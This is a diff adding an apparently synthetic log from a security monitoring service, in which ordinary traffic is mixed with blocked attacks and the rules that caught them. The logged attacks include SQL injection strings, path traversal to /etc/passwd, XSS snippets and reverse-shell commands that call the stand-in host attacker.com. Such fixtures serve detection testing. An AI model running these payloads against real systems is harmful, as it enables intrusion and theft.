@@ -1,0 +1,130 @@
+2026-10-09T16:25:01.123Z [INFO] Started GritShield SOC monitoring
+2026-10-09T16:25:02.456Z [DEBUG] Connected to backend: api.gritshield.local
+2026-10-09T16:25:05.789Z [INFO] Metrics collection enabled
+2026-10-09T16:25:10.012Z [INFO] User admin logged in from 192.168.1.100
+2026-10-09T16:25:15.234Z [INFO] GET /api/v1/users?page=1&limit=50 from 10.0.0.5 - 200 OK
+2026-10-09T16:25:20.456Z [INFO] POST /api/v1/logs with 1500 events - 201 Created
+2026-10-09T16:25:25.678Z [WARN] Slow query detected: 2.3s for user lookup
+2026-10-09T16:25:30.890Z [INFO] Database backup started
+2026-10-09T16:25:35.012Z [DEBUG] Cache hit ratio: 94.2%
+2026-10-09T16:25:40.234Z [INFO] Health check passed: all systems nominal
+2026-10-09T16:26:01.345Z [ERROR] Connection timeout from 172.16.0.50 - retrying
+2026-10-09T16:26:02.567Z [CRITICAL] SQL INJECTION ATTEMPT: GET /search?q=users' or 1=1 -- from 203.0.113.42
+2026-10-09T16:26:03.789Z [CRITICAL] THREAT DETECTED [sqli.boolean]: Payload contains "or 1=1"
+2026-10-09T16:26:04.901Z [WARN] Request blocked by WAF, logged for review
+2026-10-09T16:26:05.123Z [INFO] Attacker IP 203.0.113.42 added to watchlist
+2026-10-09T16:26:06.345Z [DEBUG] Rule engine running: 8.2ms
+2026-10-09T16:26:10.567Z [INFO] Normal traffic: POST /api/v1/analytics from 10.0.1.20 - 200 OK
+2026-10-09T16:26:15.789Z [INFO] User john.doe updated profile
+2026-10-09T16:26:20.901Z [DEBUG] Query plan optimized for product search
+2026-10-09T16:26:25.123Z [INFO] Background job: report generation completed
+2026-10-09T16:26:30.345Z [INFO] Cache invalidated for session tokens
+2026-10-09T16:26:31.456Z [CRITICAL] DIRECTORY TRAVERSAL ATTACK: GET /files?path=../../etc/passwd from 198.51.100.89
+2026-10-09T16:26:32.567Z [CRITICAL] THREAT DETECTED [traversal.path]: Payload contains "../"
+2026-10-09T16:26:33.678Z [WARN] 403 Forbidden response sent
+2026-10-09T16:26:34.789Z [INFO] Incident #5847 created: traversal attempt
+2026-10-09T16:26:35.901Z [DEBUG] File system access denied as expected
+2026-10-09T16:26:40.012Z [INFO] Regular user action: liked post #12345
+2026-10-09T16:26:45.234Z [INFO] Newsletter scheduled for 2026-10-10
+2026-10-09T16:26:50.456Z [DEBUG] Memory usage: 2.1 GB (87%)
+2026-10-09T16:26:55.678Z [INFO] Metrics: 1,250 req/sec, 50 threats/min
+2026-10-09T16:27:01.789Z [CRITICAL] XSS PAYLOAD DETECTED: POST /comments with body containing <script>alert('xss')</script> from 192.0.2.15
+2026-10-09T16:27:02.901Z [CRITICAL] THREAT DETECTED [xss.script]: Payload contains "<script"
+2026-10-09T16:27:03.012Z [WARN] User input sanitized automatically
+2026-10-09T16:27:04.123Z [INFO] Incident #5848 created: XSS attempt
+2026-10-09T16:27:05.234Z [DEBUG] Payload logged for investigation
+2026-10-09T16:27:10.345Z [INFO] Email notification sent to security team
+2026-10-09T16:27:15.567Z [INFO] User session refreshed for admin
+2026-10-09T16:27:20.789Z [INFO] Configuration reload completed
+2026-10-09T16:27:25.901Z [DEBUG] Active connections: 248
+2026-10-09T16:27:30.012Z [INFO] Routine maintenance completed
+2026-10-09T16:27:31.234Z [CRITICAL] REVERSE SHELL ATTEMPT: Raw bytes detected containing "bash -i >& /dev/tcp/attacker.com/4444" from 198.51.100.200
+2026-10-09T16:27:32.345Z [CRITICAL] THREAT DETECTED [shell.reverse]: Payload contains "bash -i >& /dev/tcp"
+2026-10-09T16:27:33.456Z [ERROR] Connection terminated immediately
+2026-10-09T16:27:34.567Z [WARN] Attacker IP 198.51.100.200 blocked at network layer
+2026-10-09T16:27:35.678Z [INFO] Incident #5849 created: reverse shell attempt
+2026-10-09T16:27:40.789Z [INFO] Dashboard updated with latest metrics
+2026-10-09T16:27:45.901Z [DEBUG] Page load time: 245ms
+2026-10-09T16:27:50.012Z [INFO] User search: results returned in 1.2s
+2026-10-09T16:27:55.234Z [INFO] API rate limiting applied to IP 192.0.2.100
+2026-10-09T16:28:00.345Z [DEBUG] Load balancer health check: all nodes healthy
+2026-10-09T16:28:01.567Z [CRITICAL] SQL INJECTION VARIANT: DELETE request with payload "admin' UNION SELECT password FROM users --" from 203.0.113.99
+2026-10-09T16:28:02.678Z [CRITICAL] THREAT DETECTED [sqli.query]: Payload contains "union select"
+2026-10-09T16:28:03.789Z [CRITICAL] THREAT DETECTED [scanner.tool]: Payload contains "sqlmap"
+2026-10-09T16:28:04.901Z [ERROR] Request rejected and logged
+2026-10-09T16:28:05.012Z [INFO] Incident #5850 created: Advanced SQL injection
+2026-10-09T16:28:10.123Z [INFO] Normal user action: downloaded report
+2026-10-09T16:28:15.345Z [INFO] Scheduled backup completed successfully
+2026-10-09T16:28:20.567Z [DEBUG] Database optimization running
+2026-10-09T16:28:25.789Z [INFO] 15,000+ logs processed this session
+2026-10-09T16:28:30.901Z [INFO] System performance nominal
+2026-10-09T16:28:31.012Z [CRITICAL] AUTOMATED SCANNER DETECTED: User-Agent "sqlmap/1.6.2" from 198.51.100.150
+2026-10-09T16:28:32.123Z [CRITICAL] THREAT DETECTED [scanner.tool]: Payload contains "sqlmap"
+2026-10-09T16:28:33.234Z [WARN] 403 Forbidden + bot challenge sent
+2026-10-09T16:28:34.345Z [INFO] Incident #5851 created: Scanner activity
+2026-10-09T16:28:35.456Z [DEBUG] CAPTCHA challenge presented
+2026-10-09T16:28:40.567Z [INFO] Legitimate user: completed purchase #98765
+2026-10-09T16:28:45.789Z [INFO] Invoice #98765 sent to customer
+2026-10-09T16:28:50.901Z [DEBUG] Payment gateway response: 200 OK
+2026-10-09T16:28:55.012Z [INFO] Order tracking updated
+2026-10-09T16:29:00.234Z [INFO] Weekly digest email queued
+2026-10-09T16:29:01.345Z [CRITICAL] DIRECTORY TRAVERSAL WITH ENCODING: GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd from 192.0.2.77
+2026-10-09T16:29:02.456Z [CRITICAL] THREAT DETECTED [traversal.path]: Payload contains "%2e%2e%2f"
+2026-10-09T16:29:03.567Z [ERROR] File access blocked
+2026-10-09T16:29:04.678Z [INFO] Incident #5852 created: URL-encoded traversal
+2026-10-09T16:29:05.789Z [WARN] Attacker profile created for behavioral analysis
+2026-10-09T16:29:10.901Z [INFO] Regular traffic spike detected - normal business hours pattern
+2026-10-09T16:29:15.012Z [DEBUG] Concurrent requests: 1,245
+2026-10-09T16:29:20.234Z [INFO] Response time: 95th percentile at 340ms
+2026-10-09T16:29:25.456Z [INFO] Database queries per second: 2,340
+2026-10-09T16:29:30.678Z [INFO] All systems operating within parameters
+2026-10-09T16:29:31.789Z [CRITICAL] XSS VIA EVENT HANDLER: POST /profile with "img src=x onerror=alert('xss')" from 203.0.113.55
+2026-10-09T16:29:32.901Z [CRITICAL] THREAT DETECTED [xss.script]: Payload contains "onerror="
+2026-10-09T16:29:33.012Z [WARN] Input sanitization applied
+2026-10-09T16:29:34.123Z [INFO] Incident #5853 created: Event handler XSS
+2026-10-09T16:29:35.234Z [DEBUG] Content Security Policy headers verified
+2026-10-09T16:29:40.345Z [INFO] User feedback form submitted
+2026-10-09T16:29:45.567Z [DEBUG] Feedback sentiment analysis: positive (87%)
+2026-10-09T16:29:50.789Z [INFO] Suggestion logged for product team
+2026-10-09T16:29:55.901Z [INFO] System uptime: 45 days 12 hours
+2026-10-09T16:30:00.012Z [INFO] Hourly metrics snapshot captured
+2026-10-09T16:30:01.123Z [CRITICAL] COMMAND INJECTION: Raw socket connection with "nc -e /bin/sh attacker.com 5555" from 198.51.100.33
+2026-10-09T16:30:02.234Z [CRITICAL] THREAT DETECTED [shell.reverse]: Payload contains "nc -e /bin"
+2026-10-09T16:30:03.345Z [ERROR] Connection terminated and blocked
+2026-10-09T16:30:04.456Z [WARN] IP 198.51.100.33 permanently blacklisted
+2026-10-09T16:30:05.567Z [INFO] Incident #5854 created: Reverse shell via nc
+2026-10-09T16:30:10.678Z [INFO] Automated incident response triggered
+2026-10-09T16:30:15.789Z [DEBUG] Email alerts sent to: sec-team@company.local
+2026-10-09T16:30:20.901Z [INFO] Incident management system updated
+2026-10-09T16:30:25.012Z [INFO] On-call engineer notified
+2026-10-09T16:30:30.234Z [WARN] Alert fatigue check: 8 incidents in 5 minutes
+2026-10-09T16:30:31.345Z [CRITICAL] SQL INJECTION WITH DROP: POST /admin with "'; DROP TABLE users; --" from 192.0.2.201
+2026-10-09T16:30:32.456Z [CRITICAL] THREAT DETECTED [sqli.query]: Payload contains "drop table"
+2026-10-09T16:30:33.567Z [CRITICAL] SEVERE THREAT - Database operation blocked
+2026-10-09T16:30:34.678Z [ERROR] Immediate incident escalation triggered
+2026-10-09T16:30:35.789Z [INFO] Incident #5855 created: Destructive SQL injection
+2026-10-09T16:30:36.901Z [CRITICAL] Emergency team contacted
+2026-10-09T16:30:40.012Z [INFO] Source IP added to emergency blocklist
+2026-10-09T16:30:45.234Z [INFO] Vulnerability assessment initiated
+2026-10-09T16:30:50.456Z [DEBUG] No actual data loss detected
+2026-10-09T16:30:55.678Z [INFO] All tables verified intact
+2026-10-09T16:31:00.789Z [INFO] Post-incident cleanup completed
+2026-10-09T16:31:01.890Z [CRITICAL] AUTOMATED VULNERABILITY SCANNER: User-Agent "Acunetix/15.0" from 203.0.113.33
+2026-10-09T16:31:02.901Z [CRITICAL] THREAT DETECTED [scanner.tool]: Payload contains "acunetix"
+2026-10-09T16:31:03.012Z [WARN] Scanner blocked and tracked
+2026-10-09T16:31:04.123Z [INFO] Incident #5856 created: Vulnerability scanner
+2026-10-09T16:31:05.234Z [DEBUG] Multiple request patterns flagged as scanning behavior
+2026-10-09T16:31:10.345Z [INFO] Normal traffic resumed
+2026-10-09T16:31:15.567Z [INFO] Session activity: 2,145 active users
+2026-10-09T16:31:20.789Z [INFO] Database replication lag: 0.2ms
+2026-10-09T16:31:25.901Z [INFO] Cache coherency verified
+2026-10-09T16:31:30.012Z [INFO] Security posture: STRONG
+2026-10-09T16:31:31.123Z [CRITICAL] PYTHON REVERSE SHELL: Raw connection with "python -c 'import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",8888))'" from 198.51.100.15
+2026-10-09T16:31:32.234Z [CRITICAL] THREAT DETECTED [shell.reverse]: Payload contains "python -c 'import socket"
+2026-10-09T16:31:33.345Z [ERROR] Malicious connection closed
+2026-10-09T16:31:34.456Z [WARN] Advanced threat indicator noted
+2026-10-09T16:31:35.567Z [INFO] Incident #5857 created: Python reverse shell
+2026-10-09T16:31:40.678Z [INFO] Threat intelligence shared with CERT
+2026-10-09T16:31:45.789Z [DEBUG] Pattern analysis: Multiple attack vectors from same network
+2026-10-09T16:31:50.901Z [WARN] Possible coordinated attack campaign detected
+2026-10-09T16:31:55.012Z [INFO] Summary: 11 critical incidents, 0 successful breaches
